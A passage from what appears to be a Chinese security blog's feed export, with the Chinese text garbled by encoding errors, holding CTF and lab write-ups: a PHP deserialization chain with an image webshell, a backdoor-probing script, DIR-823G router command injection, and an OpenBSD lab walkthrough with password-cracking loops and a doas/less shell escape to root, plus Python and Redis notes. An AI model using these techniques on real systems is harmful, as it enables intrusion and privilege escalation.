upload_imgÊñπÊ≥ï‰ºöË∞ÉÁî®login_checkÂèçÂ∫èÂàóÂåñ ËÄåËøô‰∏™Êìç‰Ωú‰∏≠ÁöÑ $this-&gt;ext„ÄÅ$this-&gt;filename_tmp„ÄÅ$this-&gt;filename ÂùáÂèØÈÄöËøáÂèçÂ∫èÂàóÂåñÊéßÂà∂„ÄÇ ÂêåÊó∂Âú®Profile.phpÊñá‰ª∂ÁöÑÊú´Â∞æËøòÊúâ‰∏ÄÂ§Ñ 1234567891011public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; Ëøô‰∏§‰∏™ÂáΩÊï∞ÁöÑÊÑèÊÄùÊòØÂ¶ÇÊûúËÆøÈóÆ‰∫ÜÁ±ª‰∏≠ÁöÑprivateÂ±ûÊÄßÔºåÂ∞±‰ºöË∞ÉÁî®__getÊñπÊ≥ïÔºåÂ¶ÇÊûúË∞ÉÁî®‰∫ÜÁ±ª‰∏≠‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ïÔºåÂ∞±‰ºöÈÄöËøá__callÂØπ$this-&gt;nameÊâÄÊåáÂêëÁöÑÊñπÊ≥ïËøõË°åË∞ÉÁî® ÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•Ë∞ÉÁî®‰ªªÊÑèÁöÑÁ±ªÊñπÊ≥ï ÂêåÊó∂Âú®Register.php‰∏≠Êúâ‰∏ÄÂ§ÑÔºö 123456public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; È¶ñÂÖà‰∏ä‰º†‰∏Ä‰∏™ÂõæÁâáÈ©¨Ôºå‰πãÂêéÈÄöËøáRegisterÁ±ªÁöÑ__destructÊñπÊ≥ïÔºåË∞ÉÁî®__getÊñπÊ≥ïÂæóÂà∞ÂáΩÊï∞Âêçupload_imgÔºåÂÜçË∞ÉÁî®__callÊñπÊ≥ïÔºåÈÄöËøáË∞ÉÁî®upload_imgÂèØ‰ª•ÂØπÂõæÁâáÈ©¨ËøõË°åÊîπÂêç Â¶ÇÊûúÊàë‰ª¨Â∞Ü$this-&gt;checkerËµãÂÄº‰∏∫ProfileÁ±ªÔºåÁî±‰∫éProfileÁ±ª‰∏≠‰∏çÂ≠òÂú®indexÊñπÊ≥ïÔºåÂ∞±‰ºöËß¶Âèë__callÔºåËøôÊ†∑Â∞±ËÉΩÊûÑÈÄ†‰∏ÄÊù°ÂÆåÊàêÁöÑÊîªÂáªÈìæ È´òÊòéÁöÑÈªëÂÆ¢ 1234567891011121314151617181920212223242526272829import os,reimport requestsfilenames = os.listdir('/var/www/html/src')pattern = re.compile(r"\$_[GEPOST]&#123;3,4&#125;\[.*\]")for name in filenames: print(name) with open('/var/www/html/src/'+name,'r') as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = 'uname' flag = 'Linux' # command = 'phpinfo();' # flag = 'phpinfo' if 'GET' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.get(url='http://127.0.0.1:8888/' + name + '?' + passwd + '='+ command) if flag in r.text: print('backdoor file is: ' + name) print('GET: ' + passwd) elif 'POST' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.post(url='http://127.0.0.1:8888/' + name,data=&#123;passwd:command&#125;) if flag in r.text: print('backdoor file is: ' + name) print('POST: ' + passwd) except : pass]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DIR-823GÂ§çÁé∞]]></title>
    <url>%2F2019%2F08%2F03%2FDIR-823G%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Dlink DIR-823GÊºèÊ¥ûÂ§çÁé∞(CVE-2019-7298, CVE-2019-7297) binwaleÊèêÂèñÊñá‰ª∂ Êñá‰ª∂‰∏ãËΩΩÂú∞ÂùÄ ‰πãÂêéËøõË°åÂõ∫‰ª∂ÁöÑÊ®°ÊãüÔºå ÊàêÂäüpingÈÄöÁΩëÁªú Á¨¨‰∏ÄÊ¨°ËøõÂÖ•Ë∑ØÁî±Âô®ÈúÄË¶ÅÈúÄË¶ÅËøõË°å‰∏Ä‰∫õËÆæÁΩÆÈ°µÈù¢ÔºåÊü•ÁúãÊòØÂê¶ÊúâÊú™ÊéàÊùÉËÆøÈóÆÁöÑÊÉÖÂÜµ ÂØºÂá∫ÈÖçÁΩÆÊñá‰ª∂Ôºà‰ø°ÊÅØÊ≥ÑÈú≤Ôºâ„ÄÇ &lt;!-- --&gt; ÊµèËßàÂô®ËÆøÈóÆÁõ¥Êé•ÂºπÂá∫‰∫Ü‰∏ãËΩΩÈ°µÈù¢ ÂØºÂá∫ÈÖçÁΩÆÊñá‰ª∂Ôºå Ëé∑ÂèñÂà∞Á≥ªÁªü‰ø°ÊÅØ goaheadÁ®ãÂ∫èÂàÜÊûê(ÂëΩ‰ª§Ê≥®ÂÖ•) Âú®Êü•ÁúãÂõ∫‰ª∂ÁöÑbinÁõÆÂΩïÊó∂ÂèëÁé∞‰∫Ü‰∏Ä‰∏™goaheadÁöÑÁ®ãÂ∫èÔºåËØ¥ÊòéÊ≠§Ë∑ØÁî±Âô®ÊòØÈÄöËøágoaheadËøõË°åÂºÄÂèëÁöÑ ÊãñÂÖ•Âà∞IDA‰∏≠ËøõË°åÂàÜÊûêÔºåÂèëÁé∞0x42424CÂ§ÑÊ≥®ÂÜå‰∫ÜÂ§ÑÁêÜÂáΩÊï∞ ÊäìÂèñÂà∞ÁôªÈôÜÁöÑÊï∞ÊçÆÂåÖÔºåÊòØÂèëÂæÄ/HNAP1/ÁöÑ ÂàÜÊûê/HNAP1 Â§ÑÁêÜÂáΩÊï∞ÁöÑÈÄªËæë„ÄÇ ÂáΩÊï∞‰Ωç‰∫é0x42383C Âú®Ëøô‰∏™ÈÉ®ÂàÜÔºå‰ªéÂáΩÊï∞Ë°®‰∏≠ËøõË°åÈÅçÂéÜÔºåÂØªÊâæÂáΩÊï∞ ÂáΩÊï∞Ë°®Â¶Ç‰∏ãÔºö ÊâæÂà∞‰∫ÜÈúÄË¶ÅË∞ÉÁî®ÁöÑÂ§ÑÁêÜÂáΩÊï∞ÂêéÔºå‰ºöÈ¶ñÂÖàËÆ∞ÂΩï POST ÁöÑÂéüÂßãÊä•Êñá, È¶ñÂÖàÁî® snprintf ÁîüÊàêÂëΩ‰ª§Ôºå ÁÑ∂Âêé‰ΩøÁî® system ÊâßË°å„ÄÇ Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÁõ¥Êé•Ê≥®ÂÖ• ' Êù•ÂëΩ‰ª§ÊâßË°å È™åËØÅ‰∏Ä‰∏ãÔºö ÂèÇËÄÉ DIR-823G HNAP_Entry_Func]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>goahead</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonÊñáÊ°£ÈòÖËØªÁ¨îËÆ∞3]]></title>
    <url>%2F2019%2F07%2F31%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B03%2F</url>
    <content type="text"><![CDATA[pythonÊñá‰ª∂Êìç‰Ωú ËØªÊñá‰ª∂Ôºå‰ΩøÁî®openÂáΩÊï∞ÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂ Â¶ÇÊûú‰∏çÊåáÂÆöÊ®°ÂºèÔºåÂàôÈªòËÆ§‰ª• text mode ÊâìÂºÄ ËøôÊÑèÂë≥ÁùÄ‰ªéÊñá‰ª∂‰∏≠ËØªÂèñÊàñÂÜôÂÖ•Â≠óÁ¨¶‰∏≤Êó∂ÔºåÈÉΩ‰ºö‰ª•ÊåáÂÆöÁöÑÁºñÁ†ÅÊñπÂºèËøõË°åÁºñÁ†Å„ÄÇÂ¶ÇÊûúÊú™ÊåáÂÆöÁºñÁ†ÅÊ†ºÂºèÔºåÈªòËÆ§ÂÄº‰∏éÂπ≥Âè∞Áõ∏ÂÖ≥ read()ÊñπÊ≥ïÔºåÂèØÈÄâÂèÇÊï∞sizeÔºåÂΩì size Ë¢´ÁúÅÁï•ÊàñËÄÖ‰∏∫Ë¥üÁöÑÊó∂ÂÄôÔºåÂ∞ÜËØªÂèñÂπ∂ËøîÂõûÊñá‰ª∂ÁöÑÊï¥‰∏™ÂÜÖÂÆπ readline()ÊñπÊ≥ïÔºå‰ªéÊñá‰ª∂‰∏≠ËØªÂèñ‰∏ÄË°å Â¶ÇÊûúË¶ÅÈÅçÂéÜÊñá‰ª∂ÔºåÂèØ‰ª•ÈááÂèñÈÅçÂéÜÊñá‰ª∂ÂØπË±°ÁöÑÊñπÂºèÔºö 12&gt;&gt;&gt; for line in f:... print(line, end='') ËøôÁßçÂÆûÁé∞ÊñπÂºèÊØîËæÉÈ´òÊïà Âú®ÁºñÂÜôËÑöÊú¨ÁöÑËøáÁ®ã‰∏≠ÔºåÊ≥®ÊÑèÊñá‰ª∂ÁöÑÊâìÂºÄÊñπÂºèÔºåÁºñÁ†ÅËøô‰∫õÂ∞èÁªÜËäÇ ÂÜôÊñá‰ª∂ f.write(string) ‰ºöÊää string ÁöÑÂÜÖÂÆπÂÜôÂÖ•Âà∞Êñá‰ª∂‰∏≠ÔºåÂπ∂ËøîÂõûÂÜôÂÖ•ÁöÑÂ≠óÁ¨¶Êï∞„ÄÇ f.tell() ËøîÂõû‰∏Ä‰∏™Êï¥Êï∞ÔºåÁªôÂá∫Êñá‰ª∂ÂØπË±°Âú®Êñá‰ª∂‰∏≠ÁöÑÂΩìÂâç‰ΩçÁΩÆÔºåË°®Á§∫‰∏∫‰∫åËøõÂà∂Ê®°Âºè‰∏ãÊó∂‰ªéÊñá‰ª∂ÂºÄÂßãÁöÑÂ≠óËäÇÊï∞Ôºå‰ª•ÂèäÊñáÊú¨Ê®°Âºè‰∏ãÁöÑ‰∏çÈÄèÊòéÊï∞Â≠ó„ÄÇ]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cybricsÂ§çÁé∞]]></title>
    <url>%2F2019%2F07%2F31%2Fcybrics%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[ÁõÆÂâçÂ§™Ëèú‰∫ÜÔºåÊ≤°ÂÅöÂá∫Âá†ÈÅìcybricsÁöÑÈ¢òÁõÆÔºåË∂ÅÁùÄÈ¢òÁõÆËøòÂú®Â§çÁé∞‰∏ÄÊ≥¢ Zakukozh ‰∏ãËΩΩÂú∞ÂùÄ ‰∏ãËΩΩ‰∫Ü‰∏Ä‰∏™Êñá‰ª∂Ôºå‰∫éÊòØÊÉ≥Êü•ÁúãÊñá‰ª∂Á±ªÂûãÔºö zakukozh.bin: data È¢òÁõÆ‰∏≠ÊúâÊèêÁ§∫ËØ¥ÊòØaffine cipher affine cipher‰∏≠ÊñáÁøªËØëËøáÊù•Â∞±ÊòØÊîæÂ∞ÑÂØÜÁ†ÅÔºåÂèØ‰ª•ÁêÜËß£ÊàêÁÆÄÂçïÁöÑÊõøÊç¢Âä†ÂØÜÔºåÊØîÂ¶Çwikipedia‰∏ä‰∏æÂá∫ÁöÑÊ†óÂ≠ê ‰∏Ä‰∏™Â§ßÂ∞è‰∏∫mÁöÑÂ≠óÊØçË°®ÔºåÈÄöËøáÂèòÊç¢ $E(x) = (ax+b) mod , m$ ÂæóÂà∞ÂØÜÊñá Êü•ÁúãÊñá‰ª∂ÁöÑÂçÅÂÖ≠ËøõÂà∂ÂΩ¢ÂºèÔºåÂ≠¶‰π†‰∏Ä‰∫õhexdumpÂëΩ‰ª§ 1234567891011pxy@LAPTOP-UBIEP4K5 ÓÇ∞ /mnt/f/1.ctf/cybrics/crypto ÓÇ∞ hexdump -C zakukozh.bin| head00000000 60 09 eb 82 1c ef df ef 59 59 59 1c a0 91 55 27 |`.......YYY...U&apos;|00000010 59 59 77 bc 59 59 59 2e d1 77 59 59 59 a9 44 38 |YYw.YYY..wYYY.D8|00000020 31 59 59 59 68 16 27 82 37 59 8b 6b fd 00 59 59 |1YYYh.&apos;.7Y.k..YY|00000030 59 95 62 28 dc 28 59 59 b8 ba fe 1d 08 a4 59 59 |Y.b(.(YY......YY|00000040 59 e0 e9 91 90 16 59 59 2b c6 59 59 2b c6 68 02 |Y.....YY+.YY+.h.|00000050 da 31 35 59 59 fe 7e a0 55 28 45 61 db 3c 3d 10 |.15YY.~.U(Ea.&lt;=.|00000060 08 a6 a1 a3 a4 89 ab 3e 68 b0 1b 82 a6 35 fd cd |.......&gt;h....5..|00000070 1c e0 d9 de 59 67 7f e3 45 70 b0 e2 e6 22 55 17 |....Yg..Ep...&quot;U.|00000080 32 d9 de 3e 87 1d d2 c2 59 51 e7 e6 59 49 a2 82 |2..&gt;....YQ..YI..|00000090 68 39 eb ab 77 19 7d fd a4 d9 a1 b0 ef 59 f8 07 |h9..w.&#125;......Y..| Êü•ÁúãÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆÂ¶Ç‰∏äÔºåÊ†πÊçÆÈ¢òÁõÆÁöÑÊèêÁ§∫ÔºåËøôÂ∞±ÊòØ‰ªøÂ∞ÑÂä†ÂØÜ‰πãÂêéÁöÑÁªìÊûúÔºåÈÇ£‰πàÂ¶Ç‰ΩïÁ°ÆÂÆöa,b,mËøô‰∏â‰∏™ÂèÇÊï∞ Áî±‰∫éÊòØ‰∫åËøõÂà∂Êï∞ÊçÆÔºåÈÇ£‰πàmÂ∞±ÊòØ256 aÂíåbÂ∞±ÈÄöËøáÁàÜÁ†¥Êù•Ëß£ÂÜ≥ ËÑöÊú¨Â¶Ç‰∏ãÔºö 123456789101112def reffine(a, b, c): return chr((a * (ord(c) - b)) % 256)with open('zakukozh.bin') as f: encrypted = f.read()for i in range(256): for j in range(256): decrypted = ''.join([reffine(i, j, c) for c in encrypted]) with open('output/dec_&#123;&#125;_&#123;&#125;.out'.format(i, j), 'wb') as f: f.write(decrypted) Â∞±ÊòØË∑ëÁöÑÂ§™ÊÖ¢‰∫Ü üòÇ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>cybrics</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redisÊ∫êÁ†ÅÈòÖËØª‚Äî‚Äîdict]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94dict%2F</url>
    <content type="text"><![CDATA[dictÁ±ªÂûã ÂÖàÁúãÂÆèÂÆö‰πâ ÊúÄÂü∫Êú¨ÁöÑÊòØdictÁ±ªÂûãÔºåÂ¶Ç‰∏ãÔºö 1234567typedef struct dict &#123; dictType *type; void *privdata; dictht ht[2]; PORT_LONG rehashidx; /* rehashing not in progress if rehashidx == -1 */ int iterators; /* number of iterators currently running */&#125; dict; dictType ÊòØ‰∏Ä‰∏™ÁªìÊûÑ‰ΩìÔºåÂåÖÂê´‰∫ÜdictÁöÑ‰∏Ä‰∫õÂü∫Á°ÄÊñπÊ≥ï privdata ÊòØÁßÅÊúâÊï∞ÊçÆ dictht ÊòØÂìàÂ∏åË°® rehashidx ‰ª£Ë°®ÊòØÂê¶Âú®ËøõË°åÈáçÂìàÂ∏åÔºåÂ¶ÇÊûú‰∏ç‰∏∫-1Âàô‰ª£Ë°®Ê≠£Âú®ËøõË°åÈáçÂìàÂ∏å iterators ‰ª£Ë°®Ëø≠‰ª£Âô®ÔºåÊöÇÊó∂Ëøò‰∏çÂ§™ÁêÜËß£ Êé•‰∏ãÊù•ÁúãÂìàÂ∏åË°®ÁöÑÁªìÊûÑ(dictht): 123456typedef struct dictht &#123; dictEntry **table; PORT_ULONG size; PORT_ULONG sizemask; PORT_ULONG used;&#125; dictht; tableÊòØ‰∏Ä‰∏™ÊåáÂêëdictEntryÁöÑ‰∫åÁ∫ßÊåáÈíà size‰ª£Ë°®ÂìàÂ∏åË°®ÁöÑÂ§ßÂ∞è sizemask ÊÄªÊòØÁ≠â‰∫ésize-1 used‰ª£Ë°®ËØ•ÂìàÂ∏åË°®Â∑≤ÊúâÁöÑËäÇÁÇπÊï∞Èáè ËøôÊòØdicthtÁöÑÊûÑÈÄ†Ôºö ‰∏çËøáËøôÈáå‰∏∫‰ªÄ‰πàË¶Å‰∫åÁ∫ßÊåáÈíàÂë¢Ôºü ÂèØ‰ª•ËøôÊ†∑ÁêÜËß£ÔºåÂõ†‰∏∫dictEntry *Êú¨Ë∫´Â∞±ÊòØ‰∏Ä‰∏™‰∏ÄÁ∫ßÊåáÈíàÔºåÂêåÊó∂tableÊåáÂêëÁöÑÂèàÊòØ‰∏Ä‰∏™ÊåáÈíàÊï∞ÁªÑÔºåÊâÄ‰ª•ËøôÈáåÈúÄË¶Å‰∫åÁ∫ßÊåáÈíà‰∫Ü Â§ç‰π†‰∏Ä‰∏ãÊï∞ÁªÑÊåáÈíàÂíåÊåáÈíàÊï∞ÁªÑÁöÑÊ¶ÇÂøµ Êï∞ÁªÑÊåáÈíàÔºåÊú¨Ë¥®‰∏äËøòÊòØÊåáÈíà int (*p)[n] ()ËøêÁÆó‰ºòÂÖàÁ∫ßÊõ¥È´òÔºå*‰ºòÂÖà‰∏épÁªìÂêàÔºåpËøòÊòØ‰∏Ä‰∏™ÊåáÈíàÔºå‰∏çËøápÊåáÂêëÁöÑÊòØ‰∏Ä‰∏™Êï∞ÁªÑÔºåËøôÊó∂ÂÄôp+1ËøêÁÆóÁöÑÊ≠•ÈïøÂ∞±ÊòØn,ÊïÖËøôÊ†∑ÁöÑÊåáÈíà‰πüÂè´Ë°åÊåáÈíà ÊåáÈíàÊï∞ÁªÑ int *p[n] []‰ºòÂÖàÁ∫ßÊõ¥È´òÔºåpÂÖà‰∏éÊñπÊã¨Âè∑ÁªìÂêàÔºåËøôÊó∂ÂÄôp‰ª£Ë°®ÁöÑÊòØ‰∏Ä‰∏™Êï∞ÁªÑÔºåËøô‰∏™Êï∞ÁªÑ‰∏≠ÊØè‰∏™ÂÖÉÁ¥†ÈÉΩÊòØ‰∏Ä‰∏™ÊåáÈíàÔºåÊïÖÊ≠§Êó∂pÂ∞±ÊòØ‰∫åÁ∫ßÊåáÈíà ‰πãÂêéÁªßÁª≠ÁúãdictEntryÁ±ªÂûã 12345678910typedef struct dictEntry &#123; void *key; union &#123; void *val; uint64_t u64; int64_t s64; double d; &#125; v; struct dictEntry *next;&#125; dictEntry; ËøôÈáåÈù¢Â≠òÂÇ®‰∫Ükey-valueÈîÆÂÄºÂØπÔºåÂÖ∂‰∏≠keyÊòØ‰∏Ä‰∏™void*Á±ªÂûãÁöÑÊåáÈíàÔºåÂèØ‰ª•‰ª£Ë°®‰ªªÊÑèÁ±ªÂûãÁöÑÊï∞ÊçÆÔºå‰ΩÜÊòØvalueÊòØ‰∏Ä‰∏™ËÅîÂêà‰ΩìÔºåÂèØ‰ª•Âú®ÊåáÈíàÔºåÊï¥Êï∞ÂíåÊµÆÁÇπÊï∞‰∏≠ÂèñÂÄº nextÂ±ûÊÄßÊòØÊåáÂêëÂè¶‰∏Ä‰∏™ÂìàÂ∏åË°®ËäÇÁÇπÁöÑÊåáÈíàÔºå Ëøô‰∏™ÊåáÈíàÂèØ‰ª•Â∞ÜÂ§ö‰∏™ÂìàÂ∏åÂÄºÁõ∏ÂêåÁöÑÈîÆÂÄºÂØπËøûÊé•Âú®‰∏ÄÊ¨°Ôºå ‰ª•Ê≠§Êù•Ëß£ÂÜ≥ÈîÆÂÜ≤Á™ÅÔºàcollisionÔºâÁöÑÈóÆÈ¢ò ÂèÇËÄÉ Â≠óÂÖ∏ÁöÑÂÆûÁé∞ RedisÂÜÖÈÉ®Êï∞ÊçÆÁªìÊûÑËØ¶Ëß£(1)‚Äî‚Äîdict Êï∞ÁªÑÊåáÈíàÂíåÊåáÈíàÊï∞ÁªÑÁöÑÂå∫Âà´]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>dict</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redisÊ∫êÁ†ÅÈòÖËØª‚Äî‚Äîsds]]></title>
    <url>%2F2019%2F07%2F30%2Fredis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94sds%2F</url>
    <content type="text"><![CDATA[‰ªéredisÊ∫êÁ†ÅÂºÄÂßã ÈÉΩËØ¥ÂÜô‰ª£Á†ÅÊòØÂú®Ë°®ËææËá™Â∑±ÔºåÈòÖËØª‰ª£Á†ÅÊòØÂú®ÁêÜËß£Âà´‰∫∫ÔºåÂ∞§ÂÖ∂ÊòØÈòÖËØªÈ´òË¥®ÈáèÁöÑÊ∫ê‰ª£Á†ÅÔºå‰∫éÊòØ‰æø‰ªéÂ§¥ÂºÄÂßãËØªËµ∑‰∫ÜredisÁöÑÊ∫êÁ†Å]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>redis</tag>
        <tag>sds</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Èù∂Êú∫Ê∏óÈÄè]]></title>
    <url>%2F2019%2F07%2F30%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[fourandsix2Èù∂Êú∫ ‰∏ÄÂºÄÊú∫Â∞±ÂèØ‰ª•ÁúãÂà∞IPÂú∞ÂùÄ‰Ωç192.168.41.132 ÁÑ∂ÂêénmapÂºÄÂßãÊâ´Êèè nmap -A -n -v -Pn -A 192.168.41.132 -A Enable OS detection, version detection, script scanning, and traceroute -n -n/-R: Never do DNS resolution/Always resolve [default: sometimes] -Pn Treat all hosts as online -- skip host discovery Êâ´ÊèèÁöÑÊä•ÂëäÔºö 1234567891011121314151617181920212223242526272829303132Nmap scan report for 192.168.41.132Host is up (0.00059s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)| ssh-hostkey:| 2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)| 256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)|_ 256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)111/tcp open rpcbind 2 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware)Device type: general purposeRunning: OpenBSD 6.XOS CPE: cpe:/o:openbsd:openbsd:6OS details: OpenBSD 6.0 - 6.1Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=258 (Good luck!)IP ID Sequence Generation: RandomizedTRACEROUTEHOP RTT ADDRESS1 0.59 ms 192.168.41.132 ÈöæÂæó‰∏ÄÊ¨°nmapÂèØ‰ª•Êâ´Âá∫Ëøô‰πàÂ§ö‰ø°ÊÅØ ÁúãÂà∞Èù∂Êú∫ÂºÄÊîæ‰∫Ü2049Âè∑Á´ØÂè£ÔºåÊòØnfsÊúçÂä°ÔºåÈÇ£‰πàÂ∞ùËØïÊâ´ÊèèÂèØ‰ª•ÊåÇËΩΩÁöÑÁõÆÂΩï -sV : Probe open ports to determine service/version info nmap -sV --script=nfs-showmount 192.168.41.132 Êâ´ÊèèÂèØ‰ª•ÊåÇËΩΩÁöÑÁõÆÂΩï ÁªìÊûúÔºö 123456789101112131415PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9 (protocol 2.0)111/tcp open rpcbind 2 (RPC #100000)| nfs-showmount:|_ /home/user/storage| rpcinfo:| program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3 2049/tcp nfs| 100003 2,3 2049/udp nfs| 100005 1,3 780/udp mountd|_ 100005 1,3 917/tcp mountd2049/tcp open nfs 2-3 (RPC #100003)MAC Address: 00:0C:29:81:23:53 (VMware) ÂæàÂ•ΩÔºåÈÇ£Â∞±ÂèØ‰ª•ÊåÇËΩΩÁõÆÂΩï‰∫Ü 12root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/nfspy@192.168.41.132:/home/user/storage:/&gt; nfspyshÁöÑÁî®Ê≥ïÔºö 12345678root@kali:~# nfspysh -hUsage: nfspysh [options]Options: -h, --help show this help message and exit -l List mount options available -o OPTIONS Mount options as in nfspy -c COMMAND Semicolon-separated commands to run (batch mode) ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™ÂéãÁº©ÂåÖ get backup.7z ÁÑ∂ÂêéÂ∞ùËØïÁî®7zÂéªËß£ÂéãÁº©Ôºå‰ΩÜÊòØÊúâÂØÜÁ†Å ‰∫éÊòØÁî®johnÂéªÁ†¥Ëß£ ÁÑ∂ËÄåÁàÜÁ†¥ÊúâÁÇπÊÖ¢ ‰∏çËøáÂØÜÁ†ÅÂ∞±ÊòØchocolate ps.kaliÈáåÈù¢ÂÖ∂ÂÆûÊúâÂæàÂ§öÂ≠óÂÖ∏ÁöÑÔºåÊØîÂ¶Ç/usr/share/john/password.lst Ëß£ÂéãÁº©‰πãÂêéÂæóÂà∞ÁöÑÊòØ‰∏Ä‰∏™ÂÖ¨Èí•ÂíåÁßÅÈí• ÈÄöËøá‰∏ãÈù¢ËøôÊÆµËÑöÊú¨ÁàÜÁ†¥Âá∫ÂØÜÁ†ÅÊòØ12345678 12root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done12345678 ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÁôªÈôÜ‰∫Ü ssh -i id_rsa user@192.168.41.132 ‰πãÂâç‰∏ÄÁõ¥Â∞ùËØïÊ≤°ÁôªÈôÜÊàêÂäüÔºåÂõ†‰∏∫ÊàëÂøòËÆ∞ËµãÊùÉ‰∫Ü ‰πüÂ∞±ÊòØ chmod 600 id_rsa ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÁôªÈôÜ‰∫ÜÔºö 1234567891011121314root@kali:/tmp# ssh -i id_rsa user@192.168.41.132Enter passphrase for key &apos;id_rsa&apos;:Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code. With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.fourandsix2$ Â¶Ç‰∏ãÊòØÈîôËØØÁöÑÂÅöÊ≥ïÔºö 1234567root@kali:/tmp# ssh -i id_rsa user@192.168.41.132@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0777 for &apos;id_rsa&apos; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored. ÁôªÈôÜ‰πãÂêé Ê≤°ÂäûÊ≥ïÁõ¥Êé•ËÆøÈóÆrootÊñá‰ª∂Â§π 12fourandsix2$ ls /root/ls: /root/: Permission denied Êé•‰∏ãÊù•ËøôÊ≥¢Êìç‰ΩúÂæà‰∏çÊòéÁôΩ ËæìÂÖ• doas /usr/bin/less /var/log/authlog ÁÑ∂ÂêéÊåâvËøõÂÖ•ÁºñËæëÊ®°Âºè ‰πãÂêéËæìÂÖ•:!/bin/sh ‰∫éÊòØÂ∞±ÊèêÊùÉ‰∫Ü 12fourandsix2# whoamiroot ÊàêÂäü‰∫Ü 1234567891011fourandsix2# cat /root/flag.txt Nice you hacked all the passwords!Not all tools worked well. But with some command magic...:cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;donecat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;doneHere is the flag:acd043bc3103ed3dd02eee99d5b0ff42 Ë°•ÂÖÖÊèêÊùÉÁöÑËøáÁ®ãÔºö Âú®/etc/doas.confÊñá‰ª∂‰∏≠ÊúâËøô‰∫õÂÜÖÂÆπ ÊâÄ‰ª•ÂèØ‰ª•Áî®doasÂëΩ‰ª§Êü•ÁúãauthlodÊñá‰ª∂ ÂêåÊó∂ÔºåÈÄöËøáÁºñËæëÂÆÉÔºåËøõÂÖ•‰∫Üshell ÂèÇËÄÉ FourAndSix2.01Èù∂Êú∫Ê∏óÈÄè]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>Èù∂Êú∫</tag>
        <tag>nfs</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpÂèçÂ∫èÂàóÂåñÁ¨îËÆ∞]]></title>
